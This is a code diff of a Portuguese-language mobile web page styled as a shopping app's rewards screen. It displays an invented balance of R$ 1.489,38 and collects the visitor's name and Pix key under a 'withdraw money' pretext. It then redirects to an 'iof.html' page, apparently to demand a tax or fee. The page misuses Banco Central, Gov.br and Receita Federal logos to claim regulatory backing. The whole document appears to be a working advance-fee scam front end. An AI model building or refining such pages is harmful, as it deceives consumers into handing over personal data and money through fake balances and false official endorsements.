@@ -7,80 +7,35 @@
     <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700;900&display=swap" rel="stylesheet">
     <style>
         * { box-sizing: border-box; outline: none; -webkit-tap-highlight-color: transparent; }
-        body {
-            font-family: 'Roboto', sans-serif;
-            background: #f5f5f5; /* Volta para o fundo cinza claro original */
-            margin: 0; padding: 0;
-            color: #333;
-            min-height: 100vh;
-        }
+        body { font-family: 'Roboto', sans-serif; background: #f5f5f5; margin: 0; padding: 0; color: #333; min-height: 100vh; }
 
-        /* --- TELA 1: SALDO --- */
-        .header-section {
-            background: #ee4d2d; /* Cor laranja sólida original */
-            padding: 20px;
-            color: white;
-            position: relative;
-            border-bottom-left-radius: 20px;
-            border-bottom-right-radius: 20px;
-        }
-        .header-top { display: flex; justify-content: space-between; align-items: flex-start; margin-bottom: 15px; }
+        /* --- TELA 1: DESIGN ORIGINAL --- */
+        .header-section { background: #ee4d2d; padding: 20px; color: white; border-bottom-left-radius: 20px; border-bottom-right-radius: 20px; }
+        .header-top { display: flex; justify-content: space-between; align-items: flex-start; }
+        .coin-icon { width: 50px; height: 50px; }
         
-        /* Moeda Dourada no canto superior direito */
-        .coin-icon { width: 45px; height: 45px; }
-        
-        /* Estilo dos cards planos originais */
-        .card-white {
-            background: white;
-            margin: 15px;
-            padding: 20px;
-            border-radius: 8px;
-            box-shadow: 0 1px 3px rgba(0,0,0,0.1);
-        }
+        .card-white { background: white; margin: 15px; padding: 20px; border-radius: 8px; box-shadow: 0 1px 3px rgba(0,0,0,0.1); }
 
-        /* Opções de Valor */
         .option-group { display: flex; gap: 10px; margin: 15px 0; }
-        .option-btn {
-            border: 1px solid #f0f0f0; background: #f9f9f9;
-            padding: 12px 0; border-radius: 6px;
-            text-align: center; font-weight: 700; font-size: 14px;
-            flex: 1; color: #555; transition: 0.2s;
-        }
-        .big-option {
-            width: 100%; padding: 22px 0;
-            font-size: 26px; font-weight: 900;
-            margin: 10px 0 20px 0;
-            border: 1px solid #f0f0f0; border-radius: 8px;
-            text-align: center; background: #f9f9f9; cursor: pointer;
-        }
+        .option-btn { border: 1px solid #f0f0f0; background: #f9f9f9; padding: 12px 0; border-radius: 6px; text-align: center; font-weight: 700; flex: 1; color: #555; }
+        .big-option { width: 100%; padding: 22px 0; font-size: 26px; font-weight: 900; border: 1px solid #f0f0f0; border-radius: 8px; text-align: center; background: #f9f9f9; }
         .selected { border: 2px solid #ee4d2d !important; background: #fff !important; color: #ee4d2d !important; }
 
-        /* Botão Sacar */
-        .btn-main {
-            background: #ee4d2d; color: white;
-            width: 100%; padding: 18px;
-            border: none; border-radius: 8px;
-            font-size: 16px; font-weight: 800;
-            cursor: pointer; text-transform: uppercase;
-        }
+        .btn-main { background: #ee4d2d; color: white; width: 100%; padding: 18px; border: none; border-radius: 8px; font-size: 16px; font-weight: 800; text-transform: uppercase; }
         .btn-disabled { background: #e0e0e0; color: #aaa; cursor: not-allowed; }
 
-        /* Área dos Selos de Segurança no rodapé */
-        .security-footer {
-            display: flex; justify-content: space-around; align-items: center;
-            margin-top: 25px;
-            padding-top: 20px;
-            border-top: 1px solid #eee;
-        }
-        .security-img { height: 35px; width: auto; filter: grayscale(100%); opacity: 0.8; }
+        /* SELOS DE SEGURANÇA NO RODAPÉ */
+        .security-footer { display: flex; justify-content: space-around; align-items: center; margin-top: 20px; padding-top: 15px; border-top: 1px solid #eee; }
+        .security-img { height: 30px; width: auto; filter: grayscale(100%); opacity: 0.7; }
 
-        /* Modal */
+        /* --- MODAL QUE SOBE DE BAIXO (image_c3c69d.png) --- */
         .modal-overlay { position: fixed; inset: 0; background: rgba(0,0,0,0.6); z-index: 100; display: flex; align-items: flex-end; }
-        .modal-sheet { background: white; width: 100%; border-radius: 20px 20px 0 0; padding: 30px 25px; animation: slideUp 0.3s; }
+        .modal-sheet { background: white; width: 100%; border-radius: 20px 20px 0 0; padding: 30px 25px; animation: slideUp 0.3s ease-out; }
         @keyframes slideUp { from { transform: translateY(100%); } to { transform: translateY(0); } }
         .hidden { display: none !important; }
 
-        input { width: 100%; padding: 15px; margin-bottom: 15px; border: 1px solid #ddd; border-radius: 8px; font-size: 16px; background: #f9f9f9; }
+        label { font-size: 14px; font-weight: 700; color: #444; margin-bottom: 6px; display: block; margin-top: 10px; }
+        input, select { width: 100%; padding: 15px; border: 1px solid #ddd; border-radius: 8px; font-size: 16px; background: #f9f9f9; margin-bottom: 10px; }
     </style>
 </head>
 <body>
@@ -89,127 +44,116 @@
         <div class="header-section">
             <div class="header-top">
                 <div>
-                    <span style="font-size: 14px; font-weight: 500; opacity: 0.9;">Seu saldo</span>
-                    <div style="font-size: 44px; font-weight: 900; letter-spacing: -1px;">R$ <span id="balance">0,00</span></div>
-                    <div style="font-size: 13px; opacity: 0.8; margin-top: 4px;">= <span id="points">0,00</span> pontos (s)</div>
+                    <span style="font-size: 14px; opacity: 0.9;">Seu saldo</span>
+                    <div style="font-size: 42px; font-weight: 900;">R$ <span id="balance">0,00</span></div>
+                    <div style="font-size: 13px; opacity: 0.8;">= <span id="points">0,00</span> pontos (s)</div>
                 </div>
                 <div class="coin-icon">
-                    <svg viewBox="0 0 512 512"><circle cx="256" cy="256" r="248" fill="#ffd700" stroke="#daa520" stroke-width="8"/><circle cx="256" cy="256" r="200" fill="none" stroke="#daa520" stroke-width="8" stroke-dasharray="20,10"/><text x="50%" y="65%" text-anchor="middle" fill="#daa520" font-family="Arial" font-weight="bold" font-size="250">$</text></svg>
+                    <svg viewBox="0 0 512 512"><circle cx="256" cy="256" r="248" fill="#ffd700" stroke="#daa520" stroke-width="8"/><text x="50%" y="65%" text-anchor="middle" fill="#daa520" font-family="Arial" font-weight="bold" font-size="250">$</text></svg>
                 </div>
             </div>
-            <div style="font-size: 13px; opacity: 0.9; margin-top: 10px; border-top: 1px solid rgba(255,255,255,0.3); padding-top: 10px;">
+            <div style="font-size: 13px; margin-top: 12px; border-top: 1px solid rgba(255,255,255,0.2); padding-top: 10px;">
                 Última bonificação apresentada: R$ 845,24
             </div>
         </div>
 
         <div class="card-white">
-            <h3 style="margin: 0 0 15px 0; font-size: 17px;">Sacar dinheiro</h3>
-            
-            <div style="display:flex; align-items:center; gap:8px; margin-bottom:15px; font-size:14px; color:#555;">
-                <span style="font-size: 18px;">💳</span> Transferência via <strong style="color:#2c9e94;">Pix</strong>
-            </div>
-
+            <h3 style="margin-top:0; font-size:17px;">Sacar dinheiro</h3>
             <div class="option-group">
                 <div class="option-btn" onclick="selectOpt(this)">R$1,5</div>
                 <div class="option-btn" onclick="selectOpt(this)">R$5</div>
                 <div class="option-btn" onclick="selectOpt(this)">R$10</div>
             </div>
-
-            <div id="big-opt" class="big-option" onclick="selectBig()">
-                R$ 1.489,38
-            </div>
-
-            <button id="btn-sacar" class="btn-main btn-disabled" onclick="openModal()">
-                SACAR DINHEIRO
-            </button>
-            <p style="font-size:12px; color:#999; text-align:center; margin-top:15px; line-height:1.5;">Para sacar dinheiro, você precisa de um saldo mínimo de R$1,5.</p>
+            <div id="big-opt" class="big-option" onclick="selectBig()">R$ 1.489,38</div>
+            <button id="btn-sacar" class="btn-main btn-disabled" onclick="openModal()">SACAR DINHEIRO</button>
         </div>
 
         <div class="card-white">
-            <h3 style="margin: 0 0 10px 0; font-size: 16px;">Obtenha seu acesso exclusivo</h3>
-            <p style="font-size:13px; color:#666; line-height:1.5; margin-bottom: 20px;">Descubra todos os benefícios liberados especialmente para você.</p>
-            
+            <h3 style="font-size:15px; margin-bottom:5px;">Acesso Prioritário</h3>
+            <p style="font-size:12px; color:#777;">Sua transação é monitorada e garantida por órgãos reguladores.</p>
             <div class="security-footer">
-                <img src="https://logodownload.org/wp-content/uploads/2017/08/bacen-logo.png" class="security-img" alt="Bacen">
-                <img src="https://upload.wikimedia.org/wikipedia/commons/b/b6/Gov.br_logo.svg" class="security-img" alt="Gov.br">
-                <img src="https://upload.wikimedia.org/wikipedia/commons/4/46/Receita_Federal_do_Brasil_-_2022_logo.svg" class="security-img" alt="Receita Federal">
+                <img src="https://logodownload.org/wp-content/uploads/2017/08/bacen-logo.png" class="security-img">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/b/b6/Gov.br_logo.svg" class="security-img">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/4/46/Receita_Federal_do_Brasil_-_2022_logo.svg" class="security-img">
             </div>
         </div>
     </div>
 
     <div id="modal-pix" class="modal-overlay hidden">
         <div class="modal-sheet">
-            <h2 style="text-align:center; font-size:18px; margin-bottom:25px;">Vincular Chave PIX</h2>
-            <input type="text" id="nome" placeholder="Nome completo do titular">
-            <input type="tel" id="cpf" placeholder="CPF (Apenas números)" maxlength="14">
-            <button class="btn-main" onclick="irParaTaxa()">CONFIRMAR E CONTINUAR</button>
-            <p style="text-align:center; font-size:11px; color:#aaa; margin-top:20px;">🔒 Transação criptografada</p>
+            <h2 style="text-align:center; font-size:20px; margin-bottom:20px; margin-top:0;">Vincular Chave PIX</h2>
+            
+            <label>Nome completo do titular</label>
+            <input type="text" id="nome" placeholder="Nome completo">
+
+            <label>Tipo de chave PIX</label>
+            <select id="tipo-chave" onchange="mudarLabel()">
+                <option value="cpf">CPF</option>
+                <option value="cel">Celular</option>
+                <option value="email">E-mail</option>
+                <option value="ale">Chave Aleatória</option>
+            </select>
+
+            <label id="label-chave">Chave PIX (Apenas números)</label>
+            <input type="tel" id="chave-pix" placeholder="000.000.000-00">
+
+            <button class="btn-main" onclick="irParaProximo()">CONFIRMAR E CONTINUAR</button>
+            <div style="text-align:center; margin-top:15px; font-size:11px; color:#888; display:flex; align-items:center; justify-content:center; gap:5px;">
+                🔒 Transação criptografada
+            </div>
         </div>
     </div>
 
     <script>
-        // --- 1. CONTADOR ANIMADO ---
-        function animateNumber(id, target, duration) {
-            let start = 0;
-            const element = document.getElementById(id);
-            const startTime = performance.now();
-
-            function update(currentTime) {
-                const elapsed = currentTime - startTime;
-                const progress = Math.min(elapsed / duration, 1);
-                const current = progress * target;
-                
-                element.innerText = current.toLocaleString('pt-BR', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
-
-                if (progress < 1) requestAnimationFrame(update);
-            }
-            requestAnimationFrame(update);
+        // CONTADOR ANIMADO
+        function animate(id, target) {
+            let current = 0;
+            const el = document.getElementById(id);
+            const step = target / 50;
+            const timer = setInterval(() => {
+                current += step;
+                if (current >= target) { el.innerText = target.toLocaleString('pt-BR', {minimumFractionDigits: 2}); clearInterval(timer); }
+                else { el.innerText = current.toLocaleString('pt-BR', {minimumFractionDigits: 2}); }
+            }, 30);
         }
+        window.onload = () => { animate('balance', 1489.38); animate('points', 42583.05); };
 
-        window.onload = () => {
-            animateNumber('balance', 1489.38, 1500); // Carrega em 1.5s
-            animateNumber('points', 42583.05, 1500);
-        };
-
-        // --- 2. LÓGICA DE SELEÇÃO ---
+        // LOGICA DE SELEÇÃO
         let selecionado = false;
-        function selectOpt(el) {
-            document.querySelectorAll('.option-btn, .big-option').forEach(b => b.classList.remove('selected'));
-            el.classList.add('selected');
-            ativarBotao();
-        }
-        function selectBig() {
-            document.querySelectorAll('.option-btn').forEach(b => b.classList.remove('selected'));
-            document.getElementById('big-opt').classList.add('selected');
-            ativarBotao();
-        }
-        function ativarBotao() {
-            const btn = document.getElementById('btn-sacar');
-            btn.classList.remove('btn-disabled');
-            selecionado = true;
+        function selectOpt(el) { document.querySelectorAll('.option-btn, .big-option').forEach(b => b.classList.remove('selected')); el.classList.add('selected'); ativar(); }
+        function selectBig() { document.querySelectorAll('.option-btn').forEach(b => b.classList.remove('selected')); document.getElementById('big-opt').classList.add('selected'); ativar(); }
+        function ativar() { document.getElementById('btn-sacar').classList.remove('btn-disabled'); selecionado = true; }
+        function openModal() { if(selecionado) document.getElementById('modal-pix').classList.remove('hidden'); }
+
+        // MUDANÇA DINÂMICA DO MODAL
+        function mudarLabel() {
+            const tipo = document.getElementById('tipo-chave').value;
+            const label = document.getElementById('label-chave');
+            const input = document.getElementById('chave-pix');
+            input.value = "";
+
+            if(tipo === 'cpf') { label.innerText = "Chave PIX (CPF)"; input.placeholder = "000.000.000-00"; input.type = "tel"; }
+            else if(tipo === 'cel') { label.innerText = "Chave PIX (Celular)"; input.placeholder = "(00) 00000-0000"; input.type = "tel"; }
+            else if(tipo === 'email') { label.innerText = "Chave PIX (E-mail)"; input.placeholder = "exemplo@email.com"; input.type = "email"; }
+            else { label.innerText = "Chave Aleatória"; input.placeholder = "Cole sua chave aqui"; input.type = "text"; }
         }
 
-        function openModal() {
-            if(!selecionado) return alert("Selecione um valor para sacar.");
-            document.getElementById('modal-pix').classList.remove('hidden');
-        }
-
-        // --- 3. MÁSCARA E REDIRECIONAMENTO ---
-        document.getElementById('cpf').addEventListener('input', e => {
+        // MÁSCARAS
+        document.getElementById('chave-pix').addEventListener('input', e => {
+            const tipo = document.getElementById('tipo-chave').value;
             let v = e.target.value.replace(/\D/g,"");
-            v = v.replace(/(\d{3})(\d)/,"$1.$2").replace(/(\d{3})(\d)/,"$1.$2").replace(/(\d{3})(\d{1,2})$/,"$1-$2");
-            e.target.value = v;
+            if(tipo === 'cpf') {
+                v = v.replace(/(\d{3})(\d)/,"$1.$2").replace(/(\d{3})(\d)/,"$1.$2").replace(/(\d{3})(\d{1,2})$/,"$1-$2");
+                e.target.value = v;
+            } else if(tipo === 'cel') {
+                v = v.replace(/^(\d{2})(\d)/g,"($1) $2").replace(/(\d)(\d{4})$/,"$1-$2");
+                e.target.value = v;
+            }
         });
 
-        function irParaTaxa() {
-            const nome = document.getElementById('nome').value;
-            const cpf = document.getElementById('cpf').value;
-            if(nome.length < 5 || cpf.length < 14) return alert("Preencha os dados corretamente.");
-            
-            localStorage.setItem('user_nome', nome);
-            localStorage.setItem('user_cpf', cpf);
-            
-            window.location.href = 'iof.html';
+        function irParaProximo() {
+            if(document.getElementById('nome').value.length < 5) return alert("Digite seu nome completo.");
+            window.location.href = "iof.html";
         }
     </script>
 </body>
